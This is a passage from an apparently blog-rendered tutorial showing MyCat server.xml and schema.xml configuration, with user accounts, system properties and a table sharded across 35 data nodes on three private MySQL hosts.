class="comment">&lt;!--&#x9ED8;&#x8BA4;&#x4E3A;type 0: DirectByteBufferPool | type 1 ByteBufferArena | type 2 NettyBufferPool --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;processorBufferPoolType&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&#x9ED8;&#x8BA4;&#x662F;65535 64K &#x7528;&#x4E8E;sql&#x89E3;&#x6790;&#x65F6;&#x6700;&#x5927;&#x6587;&#x672C;&#x957F;&#x5EA6; --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;maxStringLiteralLength&quot;&gt;65535&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;sequnceHandlerType&quot;&gt;0&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;backSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;frontSocketNoDelay&quot;&gt;1&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;processorExecutor&quot;&gt;16&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        &lt;property name=&quot;serverPort&quot;&gt;8066&lt;/property&gt; &lt;property name=&quot;managerPort&quot;&gt;9066&lt;/property&gt;</span></span><br><span class="line"><span class="comment">                        &lt;property name=&quot;idleTimeout&quot;&gt;300000&lt;/property&gt; &lt;property name=&quot;bindIp&quot;&gt;0.0.0.0&lt;/property&gt;</span></span><br><span class="line"><span class="comment">                        &lt;property name=&quot;dataNodeIdleCheckPeriod&quot;&gt;300000&lt;/property&gt; 5 * 60 * 1000L; //&#x8FDE;&#x63A5;&#x7A7A;&#x95F2;&#x68C0;&#x67E5;</span></span><br><span class="line"><span class="comment">                        &lt;property name=&quot;frontWriteQueueSize&quot;&gt;4096&lt;/property&gt; &lt;property name=&quot;processors&quot;&gt;32&lt;/property&gt; --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5F00;&#x5173;&#xFF0C;0&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF0C;1&#x4E3A;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#xFF08;&#x5982;&#x679C;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5185; &#x53EA;&#x6D89;&#x53CA;&#x5168;&#x5C40;&#x8868;&#xFF0C;&#x5219;&#x4E0D;&#x8FC7;&#x6EE4;&#xFF09;&#xFF0C;2&#x4E3A;&#x4E0D;&#x8FC7;&#x6EE4;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;,&#x4F46;&#x662F;&#x8BB0;&#x5F55;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;handleDistributedTransactions&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        off heap for merge/order/group/limit      1&#x5F00;&#x542F;   0&#x5173;&#x95ED;</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useOffHeapForMerge&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        &#x5355;&#x4F4D;&#x4E3A;m</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;memoryPageSize&quot;</span>&gt;</span>64k<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        &#x5355;&#x4F4D;&#x4E3A;k</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;spillsFileBufferSize&quot;</span>&gt;</span>1k<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useStreamOutput&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                        &#x5355;&#x4F4D;&#x4E3A;m</span></span><br><span class="line"><span class="comment">                --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;systemReserveMemorySize&quot;</span>&gt;</span>384m<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!--&#x662F;&#x5426;&#x91C7;&#x7528;zookeeper&#x534F;&#x8C03;&#x5207;&#x6362;  --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useZKSwitch&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x8DEF;&#x5F84; --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;XARecoveryLogBaseDir&quot;&gt;./&lt;/property&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!-- XA Recovery Log&#x65E5;&#x5FD7;&#x540D;&#x79F0; --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;XARecoveryLogBaseName&quot;&gt;tmlog&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&#x5982;&#x679C;&#x4E3A; true&#x7684;&#x8BDD; &#x4E25;&#x683C;&#x9075;&#x5B88;&#x9694;&#x79BB;&#x7EA7;&#x522B;,&#x4E0D;&#x4F1A;&#x5728;&#x4EC5;&#x4EC5;&#x53EA;&#x6709;select&#x8BED;&#x53E5;&#x7684;&#x65F6;&#x5019;&#x5728;&#x4E8B;&#x52A1;&#x4E2D;&#x5207;&#x6362;&#x8FDE;&#x63A5;--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;strictTxIsolation&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useZKSwitch&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">system</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- &#x5168;&#x5C40;SQL&#x9632;&#x706B;&#x5899;&#x8BBE;&#x7F6E; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x767D;&#x540D;&#x5355;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x901A;&#x914D;&#x7B26;%&#x6216;&#x7740;*--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.0.*&quot; user=&quot;root&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.0.*&quot; user=&quot;root&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;127.*&quot; user=&quot;root&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x4F8B;&#x5982;&lt;host host=&quot;1*7.*&quot; user=&quot;root&quot;/&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&#x8FD9;&#x4E9B;&#x914D;&#x7F6E;&#x60C5;&#x51B5;&#x4E0B;&#x5BF9;&#x4E8E;127.0.0.1&#x90FD;&#x80FD;&#x4EE5;root&#x8D26;&#x6237;&#x767B;&#x5F55;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        &lt;firewall&gt;</span></span><br><span class="line"><span class="comment">           &lt;whitehost&gt;</span></span><br><span class="line"><span class="comment">              &lt;host host=&quot;1*7.0.0.*&quot; user=&quot;root&quot;/&gt;</span></span><br><span class="line"><span class="comment">           &lt;/whitehost&gt;</span></span><br><span class="line"><span class="comment">       &lt;blacklist check=&quot;false&quot;&gt;</span></span><br><span class="line"><span class="comment">       &lt;/blacklist&gt;</span></span><br><span class="line"><span class="comment">        &lt;/firewall&gt;</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">defaultAccount</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;schemas&quot;</span>&gt;</span>mycatdb<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">&lt;!-- &#x8868;&#x7EA7; DML &#x6743;&#x9650;&#x8BBE;&#x7F6E; --&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                &lt;privileges check=&quot;false&quot;&gt;</span></span><br><span class="line"><span class="comment">                        &lt;schema name=&quot;TESTDB&quot; dml=&quot;0110&quot; &gt;</span></span><br><span class="line"><span class="comment">                                &lt;table name=&quot;tb01&quot; dml=&quot;0000&quot;&gt;&lt;/table&gt;</span></span><br><span class="line"><span class="comment">                                &lt;table name=&quot;tb02&quot; dml=&quot;1111&quot;&gt;&lt;/table&gt;</span></span><br><span class="line"><span class="comment">                        &lt;/schema&gt;</span></span><br><span class="line"><span class="comment">                &lt;/privileges&gt;</span></span><br><span class="line"><span class="comment">                 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>ccc.456<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;schemas&quot;</span>&gt;</span>mycatdb<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;readOnly&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mycat:server</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><code>schema.xml</code></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE mycat:schema SYSTEM &quot;schema.dtd&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mycat:schema</span> <span class="attr">xmlns:mycat</span>=<span class="string">&quot;http://io.mycat/&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;mycatdb&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">name</span>=<span class="string">&quot;jaking_member&quot;</span> <span class="attr">dataNode</span>=<span class="string">&quot;dnmycatdb$1-35&quot;</span> <span class="attr">rule</span>=<span class="string">&quot;sharding-by-intfile-mycatdb-jakingtest_member&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">schema</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb1-dnmycatdb12 &#x5BF9;&#x5E94;&#x7684; 192.168.73.21 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb1&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb01&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb2&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb02&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb3&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb03&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb4&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb04&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb5&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb05&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb6&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb06&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb7&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb07&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb8&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb08&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb9&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb09&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb10&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb10&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb11&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb11&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb12&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb12&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb13-dnmycatdb24 &#x5BF9;&#x5E94;&#x7684; 192.168.73.22 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684; &#x7269;&#x7406; schema --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb13&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb13&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb14&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb14&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb15&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb15&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb16&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb16&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb17&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb17&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb18&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb18&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb19&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb19&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb20&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb20&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb21&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb21&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb22&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb22&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb23&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb23&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb24&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb24&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb25-dnmycatdb35 &#x5BF9;&#x5E94;&#x7684; 192.168.73.23 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684; &#x7269;&#x7406; schema --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb25&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb25&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb26&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb26&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb27&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb27&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb28&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb28&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb29&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb29&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb30&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb30&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb31&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb31&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb32&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb32&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb33&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb33&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb34&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb34&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb35&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;192.168.73.23&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb35&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x8BBE;&#x5B9A; 192.168.73.21 &#x76EE;&#x524D;&#x53EA;&#x914D;&#x4E86;&#x4E00;&#x53F0;&#x7269;&#x7406;&#x673A;&#xFF0C;&#x82E5;&#x8981;&#x505A;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E0A;&#x9762;&#x7684;&#x90E8;&#x5206; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">maxCon</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">minCon</span>=<span class="string">&quot;10&quot;</span> <span class="attr">balance</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">writeType</span>=<span class="string">&quot;0&quot;</span> <span class="attr">dbType</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbDriver</span>=<span class="string">&quot;native&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- can have multi write hosts --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">&quot;192.168.73.21&quot;</span> <span class="attr">url</span>=<span class="string">&quot;192.168.73.21:3306&quot;</span> <span class="attr">user</span>=<span class="string">&quot;root&quot;</span> <span class="attr">password</span>=<span class="string">&quot;ccc.456&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">maxCon</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">minCon</span>=<span class="string">&quot;10&quot;</span> <span class="attr">balance</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">writeType</span>=<span class="string">&quot;0&quot;</span> <span class="attr">dbType</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbDriver</span>=<span class="string">&quot;native&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- can have multi write hosts --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">&quot;192.168.73.22&quot;</span> <span class="attr">url</span>=<span class="string">&quot;192.168.73.22:3306&quot;</span> <span class="attr">user</span>=<span class="string">&quot;root&quot;</span> <span class="attr">password</span>=<span class="string">&quot;ccc.456&quot;</span> /&gt;</span></span><br><span class="line"><span 